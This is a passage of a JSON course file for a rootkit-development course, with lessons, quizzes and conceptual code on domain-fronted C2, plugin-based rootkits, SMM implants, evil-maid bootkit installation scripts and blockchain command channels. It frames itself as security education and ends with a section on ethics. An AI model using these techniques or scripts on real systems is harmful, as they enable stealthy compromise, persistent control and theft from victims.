                    "Understand how P2P networks can be used for a decentralized rootkit botnet.",
                    "Explore the architecture of a cloud-based rootkit C&C.",
                    "Deconstruct a rootkit that uses a microservice architecture.",
                    "Discuss the potential for deploying rootkits in a serverless environment."
                ],
                "content": {
                    "overview": "This lesson explores the future of rootkit design, moving beyond single, monolithic implants to the advanced, distributed architectures that will define the next generation of stealth malware. We will examine how rootkits can leverage peer-to-peer networks, cloud infrastructure, and microservices to create C&C systems that are incredibly resilient and difficult to disrupt.",
                "sections": [
                    {
                        "title": "Distributed and P2P Rootkit Networks",
                        "content": "<p>A traditional botnet has a centralized C&C server. If defenders can find and sinkhole that server, the entire botnet is decapitated. A P2P botnet has no central server.</p><p>Instead, each infected machine (a 'peer') communicates with a small number of other peers. Commands are propagated through the network from peer to peer. This makes the botnet extremely resilient. To take it down, you would have to clean every single infected machine, as any remaining peer can be used to control the others. A rootkit can be used to hide the P2P networking client, making this type of botnet very difficult to track and remediate.</p>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Cloud-Based Rootkit Infrastructure",
                            "content": "<p>Attackers are now using the cloud to build highly resilient and anonymous C&C infrastructure.</p><p><strong>Real-world Example: Domain Fronting.</strong> An attacker wants to hide their C&C traffic. They set up a web service behind a major cloud Content Delivery Network (CDN) like Amazon CloudFront. The rootkit's C&C traffic is sent to a legitimate, high-reputation domain like `a0.awsstatic.com`. The `Host` header inside the HTTPS request, which is encrypted, tells the CDN to forward the request to the attacker's actual malicious server. To any network firewall, it just looks like the victim machine is talking to Amazon. This technique, called 'domain fronting', makes it nearly impossible to block the C2 traffic without blocking the entire CDN, which would have a massive business impact.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Microservice and Serverless Rootkits",
                            "content": "<p>This is a more theoretical but emerging area of research. A rootkit could be broken into many small, independent microservices. For example, one microservice for persistence, one for keystroke logging, and one for C&C. These could be deployed in containers, making the overall architecture more resilient and harder to analyze.</p><p>A serverless rootkit would be even stealthier. An attacker could use a compromised cloud account to deploy a serverless function (like AWS Lambda) that acts as their C2 server. This function only exists and runs for a few seconds when it is called, making it an extremely difficult piece of infrastructure for defenders to find and analyze.</p>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Cloud Rootkit Infrastructure (Terraform)",
                            "language": "terraform",
                            "code": "// This is a conceptual Terraform script demonstrating how an attacker could\n// rapidly and automatically deploy a resilient C2 infrastructure using a CDN\n// for domain fronting.\n\n# 1. Define the cloud provider (e.g., AWS)\nprovider \"aws\" {\n  region = \"us-east-1\"\n}\n\n# 2. Define the backend C2 server\nresource \"aws_instance\" \"c2_server\" {\n  ami           = \"ami-01234567\"\n  instance_type = \"t2.micro\"\n  # ... (other configuration)\n}\n\n# 3. Define the Content Delivery Network (CDN) distribution\nresource \"aws_cloudfront_distribution\" \"c2_cdn\" {\n  origin {\n    domain_name = aws_instance.c2_server.public_dns\n    origin_id   = \"myC2Origin\"\n  }\n\n  enabled             = true\n  is_ipv6_enabled     = true\n\n  # The key part: configure the CDN to forward the Host header to the origin.\n  # This allows the domain fronting to work.\n  forwarded_values {\n    query_string = false\n    headers      = [\"Host\"]\n    cookies      = { forward = \"none\" }\n  }\n  \n  # ... (other configuration)\n}"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the primary advantage of a P2P botnet architecture over a centralized one?",
                            "options": [
                                "It is easier to build.",
                                "It is much more resilient to takedowns because there is no single, central C&C server to disable.",
                                "It uses less bandwidth.",
                                "It only works on Linux."
                            ],
                            "correct": 1,
                            "explanation": "Decentralization is the key to resilience. In a P2P botnet, every infected node can potentially act as a C&C server for other nodes, making it incredibly difficult to disrupt the entire network."
                        },
                        {
                            "id": 2,
                            "question": "The technique of hiding C&C traffic by making it look like it is going to a legitimate, high-reputation domain like Google or Amazon is known as:",
                            "options": [
                                "DNS Tunneling",
                                "Domain Fronting",
                                "A P2P network",
                                "A hardware implant"
                            ],
                            "correct": 1,
                            "explanation": "Domain fronting is a powerful C&C evasion technique that abuses the functionality of Content Delivery Networks (CDNs). It makes it very difficult for defenders to block the malicious traffic without also blocking the legitimate CDN service."
                        },
                        {
                            "id": 3,
                            "question": "What is a primary forensic challenge of a rootkit or C&C channel that uses serverless functions (like AWS Lambda)?",
                            "options": [
                                "The functions run for a very long time.",
                                "The execution environment is highly ephemeral, existing for only a few seconds, which makes it extremely difficult to capture and analyze.",
                                "Serverless functions do not have access to the internet.",
                                "There are no logs for serverless functions."
                            ],
                            "correct": 1,
                            "explanation": "The extremely short-lived and stateless nature of serverless functions is their key forensic challenge. By the time an analyst can react, the function and its memory are gone. Investigation must rely on the detailed execution logs provided by the cloud platform."
                        }
                    ]
                }
            },
            {
                "id": "lesson-36",
                "title": "Rootkit Development Frameworks",
                "duration": "100 min",
                "objectives": [
                    "Design the architecture for a custom, modular rootkit framework.",
                    "Develop a plugin system to allow for extensible functionality.",
                    "Implement a secure configuration management system.",
                    "Create a robust update and deployment mechanism for a rootkit.",
                    "Apply professional software engineering principles to rootkit development."
                ],
                "content": {
                    "overview": "Sophisticated, modern rootkits are not monolithic scripts; they are complex pieces of software engineering. This lesson covers the architectural design and development of a professional rootkit framework. We will explore how to build a modular, extensible, and maintainable platform that can be adapted for a wide range of offensive operations.",
                "sections": [
                    {
                        "title": "Modular Rootkit Architecture",
                        "content": "<p>A professional rootkit is built like any other piece of complex software, with a modular design that separates different components.</p><h3>A Typical Architecture:</h3><ul><li><strong>Core Engine:</strong> The central part of the rootkit that handles initialization, communication, and the loading of other modules.</li><li><strong>Hooking Engine:</strong> A dedicated module that manages all the low-level hooking (e.g., SSDT, inline, IRP hooks).</li><li><strong>Stealth Module:</strong> Contains the logic for hiding files, processes, and network connections.</li><li><strong>Payload/Plugin Interface:</strong> A defined API that allows new malicious capabilities (e.g., a keylogger, a ransomware module) to be easily added as plugins without having to rewrite the entire rootkit.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Plugin System Development",
                            "content": "<p>A plugin system makes a rootkit incredibly flexible. The initial implant can be very small and stealthy. Once it has established a foothold, the attacker can then choose to remotely deploy only the specific plugins they need for that particular target.</p><p><strong>Real-world Example:</strong> An attacker compromises a server. The initial rootkit implant is just the core engine and the C&C module. The attacker uses the C&C channel to determine that the server is a domain controller. They then use the rootkit's update mechanism to push a new plugin to the infected machine: a specialized credential harvesting module designed to dump the Active Directory database. This modular approach minimizes the footprint of the initial implant and makes the overall operation much stealthier.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Configuration and Update Mechanisms",
                            "content": "<p>A professional rootkit needs a way to be configured and updated remotely.</p><h3>Secure Management:</h3><ul><li><strong>Configuration Management:</strong> The rootkit's configuration (e.g., the C2 server address, the names of files to hide) is not hardcoded. It is stored in an encrypted block, either in the registry, a hidden file, or a UEFI variable.</li><li><strong>Update Mechanism:</strong> The C&C protocol will include a secure command to allow the attacker to push a new version of the rootkit or a new plugin to the infected machine. This entire process must be encrypted and authenticated to prevent another attacker from hijacking the rootkit.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Plugin System Implementation (Conceptual C++)",
                            "language": "cpp",
                            "code": "// This is a conceptual C++ header file defining a plugin interface for a rootkit.\n\n#define PLUGIN_COMMAND_KEYLOG_START   1\n#define PLUGIN_COMMAND_KEYLOG_STOP    2\n#define PLUGIN_COMMAND_RANSOM_ENCRYPT 3\n\n// Each plugin must be a DLL that exports a standard set of functions.\n\n// The interface that every plugin must implement.\nclass IRootkitPlugin {\npublic:\n    // Called when the plugin is first loaded.\n    virtual bool Initialize() = 0;\n\n    // Called when the plugin receives a command from the C2 server.\n    virtual bool HandleCommand(int command_id, void* command_data) = 0;\n\n    // Called when the plugin is unloaded.\n    virtual void Shutdown() = 0;\n};\n\n// --- keylogger_plugin.cpp ---\n// This would be a separate DLL that implements the IRootkitPlugin interface.\n// Its HandleCommand function would implement the logic for starting and stopping\n// the keylogger based on the command ID.\n\n// The rootkit's core engine is responsible for loading the plugin DLL into memory\n// (e.g., using reflective injection) and calling these interface functions."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the primary advantage of a modular, plugin-based rootkit architecture?",
                            "options": [
                                "It makes the rootkit easier to detect.",
                                "It makes the rootkit highly flexible and extensible, allowing an attacker to deploy specific capabilities on-demand.",
                                "It only works on Windows.",
                                "It makes the rootkit run faster."
                            ],
                            "correct": 1,
                            "explanation": "A modular architecture is a standard software engineering best practice that also benefits malware authors. It allows them to maintain a small, stealthy core implant and only load the noisier, more specific modules (like a keylogger) when they are actually needed for a particular target."
                        },
                        {
                            "id": 2,
                            "question": "The central part of a modular rootkit that handles initialization, C&C, and the loading of other modules is known as the:",
                            "options": [
                                "Payload",
                                "Core Engine",
                                "Plugin",
                                "Hooking Engine"
                            ],
                            "correct": 1,
                            "explanation": "The core engine is the heart of the rootkit. It provides the basic functionality and the framework into which other, more specialized plugins can be loaded."
                        },
                        {
                            "id": 3,
                            "question": "Why is a secure update mechanism important for a professional rootkit?",
                            "options": [
                                "To allow the attacker to fix bugs in their rootkit and deploy new features.",
                                "To allow the victim to remove the rootkit.",
                                "To prevent another attacker from hijacking the rootkit's C&C channel and taking control of the botnet.",
                                "Both A and C."
                            ],
                            "correct": 3,
                            "explanation": "A secure update mechanism is crucial for both maintenance and security. The attacker needs to be able to update their tools, but they also need to ensure that their C&C channel is authenticated and encrypted to prevent a rival attacker from taking over their valuable infected assets."
                        }
                    ]
                }
            },
            {
                "id": "lesson-37",
                "title": "Advanced Stealth Techniques",
                "duration": "100 min",
                "objectives": [
                    "Explore the theory of hardware-level hiding and microcode modification.",
                    "Develop a rootkit that can run in System Management Mode (SMM).",
                    "Use a GPU to hide malicious computations.",
                    "Understand and defend against acoustic and electromagnetic side-channel attacks."
                ],
                "content": {
                    "overview": "This lesson explores the absolute cutting edge of stealth, moving beyond the operating system to the hardware itself. We will discuss the theoretical and practical aspects of hiding rootkit code in the most privileged parts of a computer, such as the System Management Mode of the CPU and even the GPU, making them invisible to almost all defensive software.",
                "sections": [
                    {
                        "title": "System Management Mode (SMM) Rootkits",
                        "content": "<p>SMM is the most privileged execution mode on an x86 CPU, even more so than Ring 0. It is designed for low-level hardware management and is intended to be transparent to the operating system. An attacker who can get their code to run in SMM has achieved the ultimate stealth.</p><h3>The SMM Attack:</h3><ol><li>The attacker first needs a kernel exploit to get Ring 0 execution.</li><li>They use this access to trigger a software interrupt (SMI) that transitions the CPU into SMM.</li><li>They exploit a vulnerability in the legitimate SMM handler code (which is part of the BIOS/UEFI) to get their own code to run inside SMM.</li></ol><p>Once running in SMM, the rootkit is invisible to the OS. It can periodically pause the main OS, inspect the entire contents of physical memory, and modify it with impunity. No software running on the main CPU can detect it.</p>",
                            "image": "https://images.unsplash.com/photo-1593435713588-a73de23947db?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "GPU-Based Stealth",
                            "content": "<p>A modern Graphics Processing Unit (GPU) is an extremely powerful parallel computer in its own right. An attacker can use the GPU for stealth in two ways:</p><ul><li><strong>Hiding Data:</strong> A rootkit can store its malicious code or stolen data in the GPU's dedicated video RAM (VRAM). Most forensic tools are only designed to analyze the main system RAM, so the data in VRAM is often overlooked.</li><li><strong>Hiding Computations:</strong> A task that would be suspicious if run on the main CPU (like brute-forcing passwords) can be offloaded to the GPU.</li></ul>",
                            "image": "https://images.unsplash.com/photo-1575235028124-ab6346a5a0a3?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Acoustic and Electromagnetic Stealth",
                            "content": "<p>These are highly advanced, theoretical side-channel attacks.</p><p><strong>Real-world Example: Acoustic Cryptanalysis.</strong> Researchers have demonstrated that by using a sensitive microphone placed near a computer, it is possible to analyze the high-frequency acoustic noise made by the capacitors in the CPU's power supply. The noise pattern changes slightly depending on the specific instructions the CPU is executing. By analyzing this acoustic side channel, it is theoretically possible to leak information about what the computer is doing, and even to extract cryptographic keys. While not a practical attack vector for most adversaries, it is an active area of academic research.</p>",
                            "image": "https://images.unsplash.com/photo-1552392187-952b1e4f4a3e?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "SMM Rootkit Development (Conceptual)",
                            "language": "c",
                            "code": "// This is a conceptual C code snippet for an SMM rootkit's payload.\n// This code would be run inside SMM after the initial exploit.\n\n#include <smm_runtime.h>\n\n// The rootkit's SMI handler\nEFI_STATUS SmmRootkitHandler(\n    EFI_HANDLE DispatchHandle,\n    CONST VOID* Context,\n    IN OUT VOID* CommBuffer,\n    IN OUT UINTN* CommBufferSize\n) {\n    // We are now running inside SMM, invisible to the OS.\n\n    // The C&C agent in the main OS can use a special I/O port write\n    // to trigger an SMI and pass a command to us in the CommBuffer.\n\n    // 1. Read the command from the communication buffer.\n    ROOTKIT_COMMAND* cmd = (ROOTKIT_COMMAND*)CommBuffer;\n\n    // 2. Execute the command with SMM privileges.\n    //    For example, a command to read a specific physical memory address.\n    if (cmd->CommandId == READ_PHYSICAL_MEMORY) {\n        memcpy(cmd->OutputBuffer, cmd->TargetAddress, cmd->Length);\n    }\n\n    return EFI_SUCCESS;\n}"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the most privileged execution mode on an x86 CPU, even more privileged than the Ring 0 kernel?",
                            "options": [
                                "User Mode (Ring 3)",
                                "Real Mode",
                                "System Management Mode (SMM)",
                                "Protected Mode"
                            ],
                            "correct": 2,
                            "explanation": "SMM is a highly privileged mode that is designed for system management and is intended to be transparent to the operating system. A rootkit that can run in SMM is effectively invisible to any software running on the main CPU."
                        },
                        {
                            "id": 2,
                            "question": "A rootkit that stores its malicious code in the dedicated RAM of the graphics card is an example of what kind of stealth technique?",
                            "options": [
                                "SMM rootkit",
                                "GPU-based hiding",
                                "A bootkit",
                                "A hardware implant"
                            ],
                            "correct": 1,
                            "explanation": "By using the GPU's VRAM for storage, the rootkit can evade forensic tools that are only designed to analyze the main system RAM. It is a form of data hiding."
                        },
                        {
                            "id": 3,
                            "question": "An attack that analyzes the high-frequency noise made by a CPU's power supply to leak cryptographic keys is known as an:",
                            "options": [
                                "Acoustic side-channel attack",
                                "Fault injection attack",
                                "A software exploit",
                                "A DMA attack"
                            ],
                            "correct": 0,
                            "explanation": "Acoustic cryptanalysis is a classic example of a side-channel attack. It doesn't attack the math of the crypto, but the physical implementation of the device that is performing the crypto."
                        }
                    ]
                }
            },
            {
                "id": "lesson-38",
                "title": "Bootkit Payload Delivery",
                "duration": "90 min",
                "objectives": [
                    "Exploit the network boot process (PXE) to deliver a bootkit.",
                    "Create a malicious bootable USB device.",
                    "Understand how CD/DVD autorun was exploited for delivery.",
                    "Hijack a network share boot process.",
                    "Discuss the potential for manipulating cloud boot images."
                ],
                "content": {
                    "overview": "A bootkit is a powerful persistence mechanism, but the attacker first needs a way to install it. This lesson covers the common and advanced delivery vectors for bootkits, from classic malicious USBs to more sophisticated attacks that abuse the network boot process to compromise a machine before it even has an operating system.",
                "sections": [
                    {
                        "title": "Network Boot (PXE) Exploitation",
                        "content": "<p>The Preboot Execution Environment (PXE) is a standard for booting a computer over the network. It is commonly used in large enterprises to deploy operating systems to new machines.</p><h3>The Attack:</h3><p>An attacker who is on the same local network as a victim can perform a 'rogue PXE server' attack. When the victim machine boots and sends out a DHCP request looking for a PXE server, the attacker's server responds first. It then sends a malicious bootloader to the victim machine, which executes it. This allows the attacker to install a bootkit or even a completely compromised operating system image, all over the network.</p>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "USB Boot Device Creation",
                            "content": "<p>This is a classic physical access attack.</p><p><strong>Real-world Example: The 'Evil Maid' Attack.</strong> An attacker wants to compromise the laptop of a high-value target who has left their machine unattended in a hotel room (the 'evil maid'). The attacker boots the victim's laptop from their own malicious USB drive. The OS on the USB drive is a specialized forensic environment. It automatically mounts the laptop's internal hard drive and injects a bootkit into the EFI System Partition. The attacker then removes the USB and reboots the machine. The whole process takes less than a minute. The next time the victim boots their computer, the bootkit loads into memory, and the machine is compromised. The victim is unaware anything has happened.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Cloud Boot Image Manipulation",
                            "content": "<p>In the cloud, the 'boot media' is a virtual machine image (an AMI in AWS). An attacker who can compromise an organization's custom, 'golden' machine image can inject a rootkit or other malware into it. Every single new virtual machine that is then deployed from this malicious image will be born compromised. This is a powerful supply chain attack against a cloud environment.</p>",
                            "image": "https://images.unsplash.com/photo-1526628953301-3e589a6a8b74?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "USB Bootkit Creation (Conceptual)",
                            "language": "bash",
                            "code": "# This is a conceptual workflow for creating a malicious bootable USB drive for an 'Evil Maid' attack.\n\n# 1. Start with a standard Linux live USB creator (e.g., Rufus, Ventoy).\n\n# 2. Create a bootable USB with a lightweight Linux distro.\n\n# 3. Customize the startup scripts of the live Linux environment.\n#    Edit the init scripts (e.g., /etc/rc.local) on the USB drive.\n\n# 4. Add the malicious payload script to the startup.\n#    This script will run automatically as soon as the live OS boots.\n\n# --- malicious_script.sh ---\n# #!/bin/bash\n# # a. Find the internal hard drive (e.g., /dev/sda).\n# TARGET_DRIVE=/dev/sda\n# # b. Find the EFI System Partition.\n# ESP_PARTITION=$(fdisk -l $TARGET_DRIVE | grep \"EFI System\" | awk '{print $1}')\n# # c. Mount the EFI partition.\n# mount $ESP_PARTITION /mnt/esp\n# # d. Copy the malicious UEFI driver (bootkit.efi) to the boot partition.\n# cp /usb/payloads/bootkit.efi /mnt/esp/EFI/BOOT/\n# # e. (Optional) Modify the boot configuration to ensure the malicious driver is loaded.\n# # f. Unmount and shut down.\n# umount /mnt/esp\n# poweroff"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "An attack where an adversary on the local network sets up their own server to respond to a victim's network boot request is known as a:",
                            "options": [
                                "DDoS attack",
                                "Rogue PXE server attack",
                                "ARP spoofing attack",
                                "Phishing attack"
                            ],
                            "correct": 1,
                            "explanation": "PXE (Preboot Execution Environment) is a standard for booting from the network. A rogue PXE server can intercept this process to deliver a malicious bootloader or a compromised OS image to the victim machine."
                        },
                        {
                            "id": 2,
                            "question": "The 'Evil Maid' attack is an example of what kind of payload delivery?",
                            "options": [
                                "A remote network exploit.",
                                "A physical access attack using a malicious bootable USB drive.",
                                "A phishing email.",
                                "A browser exploit."
                            ],
                            "correct": 1,
                            "explanation": "The 'Evil Maid' scenario describes an attacker with temporary, unsupervised physical access to a device. Using a bootable USB is the classic method for this attack, allowing the attacker to infect the firmware or bootloader in minutes."
                        },
                        {
                            "id": 3,
                            "question": "In a cloud environment, what is the equivalent of a malicious bootable CD or USB drive?",
                            "options": [
                                "A virtual machine.",
                                "A compromised, custom machine image (e.g., an AWS AMI).",
                                "A security group.",
                                "A cloud storage bucket."
                            ],
                            "correct": 1,
                            "explanation": "Machine images are the templates from which all new virtual machines are created. By 'trojanizing' a company's golden image, an attacker can ensure that every new server deployed is born compromised, which is a powerful supply chain attack."
                        }
                    ]
                }
            },
            {
                "id": "lesson-39",
                "title": "Next-Generation Rootkit Techniques",
                "duration": "90 min",
                "objectives": [
                    "Discuss the potential for AI-powered, adaptive rootkit behavior.",
                    "Explore how machine learning can be used to evade detection.",
                    "Analyze the use of blockchain for decentralized and resilient C&C.",
                    "Understand how an IoT botnet can be integrated with a rootkit.",
                    "Prepare for the challenge of quantum-resistant C&C communication."
                ],
                "content": {
                    "overview": "This lesson looks to the future, exploring how emerging technologies will be integrated into the next generation of rootkits. We will discuss how AI can be used to create adaptive, autonomous implants and how technologies like blockchain and IoT will create new, highly resilient platforms for command and control.",
                "sections": [
                    {
                        "title": "AI-Powered Rootkit Behavior",
                        "content": "<p>Future rootkits may incorporate AI and machine learning to become fully autonomous and adaptive.</p><p>Instead of relying on a human operator for commands, an AI-driven rootkit could have a high-level goal (e.g., 'find and exfiltrate all files related to Project X'). It could then use its own onboard AI model to autonomously perform reconnaissance on the internal network, select its own lateral movement paths, and adapt its TTPs on the fly to evade the specific defenses it encounters, all without human intervention. This would create a much faster and more formidable adversary.</p>",
                            "image": "https://images.unsplash.com/photo-1620712943543-285f212a5a54?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Blockchain-Based C&C",
                            "content": "<p>A public blockchain is a decentralized, immutable, and uncensorable database. This makes it an almost perfect platform for a highly resilient C&C server.</p><p><strong>Real-world Example:</strong> A rootkit author can encode their commands into the data field of a transaction on a public blockchain. The infected bots can simply monitor the blockchain for any new transaction involving the attacker's wallet address. When they see one, they can read the command from the transaction data. There is no C&C server for defenders to take down. The C&C is the blockchain itself, which cannot be disabled.</p>",
                            "image": "https://images.unsplash.com/photo-1621452773352-2a74c35b2917?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "IoT Botnet Integration",
                            "content": "<p>An IoT botnet (like Mirai) can be used as a massive, disposable proxy network for a rootkit's C&C traffic. The rootkit on a high-value corporate server would not connect directly to the attacker. Instead, it would proxy its traffic through a constantly changing series of compromised home routers and security cameras. This makes tracing the traffic back to the true C&C server extremely difficult.</p>",
                            "image": "https://images.unsplash.com/photo-1535683416248-8495c6b8159b?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Blockchain C&C Protocol (Conceptual)",
                            "language": "python",
                            "code": "# This conceptual Python script demonstrates how a bot could listen for commands\n# on a public blockchain like Ethereum.\n\nfrom web3 import Web3\n\n# Connect to a public Ethereum node\nw3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/YOUR_API_KEY'))\n\n# The hardcoded attacker's address the bot will monitor\nC2_ADDRESS = '0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B'\n\ndef listen_for_commands():\n    \"\"\"Monitors the blockchain for new transactions to the C2 address.\"\"\"\n    while True:\n        # Get the latest block number\n        latest_block = w3.eth.block_number\n        # ... (code to check for new transactions to our C2_ADDRESS) ...\n\n        # Assume we found a new transaction 'tx'\n        # The command is encoded in the 'input' data field of the transaction.\n        encoded_command = tx.input\n        \n        # Decode and execute the command\n        command = w3.toText(hexstr=encoded_command)\n        if command.startswith('EXEC:'):\n            # Execute the command\n            # ...\n            pass"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the primary advantage for an attacker using a public blockchain for their C&C channel?",
                            "options": [
                                "It is faster than HTTP.",
                                "It is highly decentralized, resilient, and cannot be censored or taken down by defenders.",
                                "It is completely anonymous.",
                                "It uses less bandwidth."
                            ],
                            "correct": 1,
                            "explanation": "A public blockchain is the ultimate resilient data store. By embedding their commands in transactions, an attacker can create a C&C mechanism that has no central point of failure."
                        },
                        {
                            "id": 2,
                            "question": "An AI-driven rootkit that can autonomously select its own lateral movement paths and adapt its TTPs is an example of what?",
                            "options": [
                                "A simple script.",
                                "A next-generation, autonomous threat.",
                                "A traditional botnet.",
                                "A fileless persistence mechanism."
                            ],
                            "correct": 1,
                            "explanation": "This is the future of advanced threats. The move from human-operated malware to fully autonomous malware will drastically reduce the response time that defenders have, making automated defense a necessity."
                        },
                        {
                            "id": 3,
                            "question": "Using a large botnet of compromised IoT devices to proxy a rootkit's C&C traffic is a technique for what?",
                            "options": [
                                "Making the C&C traffic faster.",
                                "Hiding the true origin of the C&C server and making attribution much more difficult.",
                                "Launching a DDoS attack.",
                                "Crashing the IoT devices."
                            ],
                            "correct": 1,
                            "explanation": "This technique uses the IoT botnet as a massive, disposable layer of obfuscation. The constantly changing proxy nodes make it extremely difficult for investigators to trace the traffic back to its source."
                        }
                    ]
                }
            },
            {
                "id": "lesson-40",
                "title": "Rootkit Research and Development",
                "duration": "90 min",
                "objectives": [
                    "Establish a formal methodology for rootkit research.",
                    "Research and discover vulnerabilities in security software.",
                    "Simulate an Advanced Persistent Threat (APT) scenario.",
                    "Integrate a zero-day exploit into a rootkit.",
                    "Discuss the capabilities of nation-state level malware.",
                    "Reflect on the ethical responsibilities and future of rootkit research."
                ],
                "content": {
                    "overview": "This final lesson brings together all the skills from the course to focus on the process of true research and development. We will discuss the methodologies for discovering new vulnerabilities in security software itself and how to simulate the capabilities of a nation-state adversary. We will conclude with a reflection on the profound ethical responsibilities that come with this powerful and dangerous knowledge.",
                "sections": [
                    {
                        "title": "Research Methodology for Rootkits",
                        "content": "<p>Rootkit research is about pushing the boundaries of what is possible. It requires a systematic and scientific approach.</p><h3>The Research Loop:</h3><ol><li><strong>Form a Hypothesis:</strong> 'I hypothesize that it is possible to bypass the EDR's process creation monitoring by using a previously undocumented kernel callback.'</li><li><strong>Reverse Engineer the Target:</strong> Deeply reverse engineer the EDR's driver to understand exactly how its monitoring works.</li><li><strong>Develop a Proof-of-Concept:</strong> Write a PoC rootkit that implements the new bypass technique.</li><li><strong>Test and Validate:</strong> Rigorously test the PoC to prove that it works and to understand its limitations.</li><li><strong>Disclose Responsibly:</strong> Report the new technique to the EDR vendor so they can develop a defense.</li></ol>",
                            "image": "https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Simulating Nation-State Capabilities",
                            "content": "<p>The most advanced rootkits are developed by nation-states. Simulating these capabilities is the job of top-tier red teams and government research labs.</p><p>This involves chaining multiple, complex techniques together: a UEFI bootkit for persistence, a hypervisor-based component for stealth, a covert C&C channel using a legitimate service, and a payload that is designed for long-term, undetected espionage. The goal of this research is to understand the 'art of the possible' in order to build the next generation of defenses.</p>",
                            "image": "https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=800&h=400&fit=crop"
                        },
                        {
                            "title": "Ethical Responsibilities and the Future",
                            "content": "<p>The knowledge of how to build these powerful tools comes with an immense ethical responsibility. This knowledge should be used to improve security, not to cause harm. The principles of legality, ethics, and responsible disclosure are not optional; they are the foundation of a professional career in this field.</p><p>The arms race between rootkit developers and defenders will never end. As new hardware and new operating systems are developed, new attack surfaces will emerge. The future of this field belongs to those who are endlessly curious, rigorously methodical, and guided by a strong ethical compass.</p>",
                            "image": "https://images.unsplash.com/photo-1552664730-d307ca884978?w=800&h=400&fit=crop"
                        }
                    ],
                    "codeExamples": [
                        {
                            "title": "Research Framework Development (Conceptual)",
                            "language": "markdown",
                            "code": "# Research Proposal: Bypassing EDR via Kernel Callback Manipulation\n\n**1. Hypothesis:**\nThe EDR product 'DefenseSystemX' primarily relies on `PsSetCreateProcessNotifyRoutine` to monitor process creation. We hypothesize that a different, less-monitored kernel callback can be abused to create a process in a way that is invisible to the EDR.\n\n**2. Methodology:**\n- **Phase 1 (Reverse Engineering):** Reverse engineer the `DefenseSystemX.sys` driver to confirm its reliance on the standard process notify routine.\n- **Phase 2 (Research):** Research alternative, undocumented kernel callbacks or APC (Asynchronous Procedure Call) techniques for process creation.\n- **Phase 3 (Development):** Develop a proof-of-concept kernel driver that uses the alternative technique to launch a process (e.g., `calc.exe`).\n- **Phase 4 (Testing):** Execute the PoC on a system with DefenseSystemX running and verify that `calc.exe` is created without triggering an alert.\n\n**3. Expected Outcome:**\nA new, documented bypass technique for a specific EDR product.\n\n**4. Responsible Disclosure Plan:**\nThe findings will be reported to the vendor of DefenseSystemX with a 90-day coordinated disclosure timeline."
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        {
                            "id": 1,
                            "question": "What is the first step in a formal research project to find a new bypass for a security product?",
                            "options": [
                                "Writing the exploit.",
                                "Forming a clear, testable hypothesis.",
                                "Publishing the results.",
                                "Contacting the vendor."
                            ],
                            "correct": 1,
                            "explanation": "All good science starts with a question. The hypothesis defines the specific goal of the research and guides the entire experimental process."
                        },
                        {
                            "id": 2,
                            "question": "What is the ultimate goal of simulating the capabilities of a nation-state adversary?",
                            "options": [
                                "To build a weapon for your own country.",
                                "To understand the 'art of the possible' in offensive security in order to develop the next generation of defensive technologies.",
                                "To get media attention.",
                                "To prove that all security is useless."
                            ],
                            "correct": 1,
                            "explanation": "This type of advanced offensive research is done for defensive purposes. By understanding what the most sophisticated attackers are capable of, defenders can anticipate their moves and build more resilient systems."
                        },
                        {
                            "id": 3,
                            "question": "The skills and knowledge involved in rootkit development are powerful. What is the most important guiding principle for a researcher in this field?",
                            "options": [
                                "To publish findings as quickly as possible.",
                                "To work in secret and never share information.",
                                "To adhere to a strict ethical framework of 'do no harm' and practice responsible disclosure.",
                                "To only focus on Windows, as other operating systems are not important."
                            ],
                            "correct": 2,
                            "explanation": "Because this research is 'dual-use' and can be weaponized, a strong ethical compass is non-negotiable. The goal of the research must be to improve security and protect users, which requires a commitment to responsible and ethical practices."
                    }
                ]
            }
        },
         {
            "id": "lesson-41",
            "title": "Windows Kernel Rootkits Advanced",
            "duration": "100 min",
            "objectives": [
                "Exploit the Filter Manager framework for advanced file system and registry hooking.",
                "Hook the Windows Filtering Platform (WFP) to control network traffic.",
                "Bypass Event Tracing for Windows (ETW) for enhanced stealth.",
                "Develop a rootkit that uses a WMI provider for persistence and C&C.",
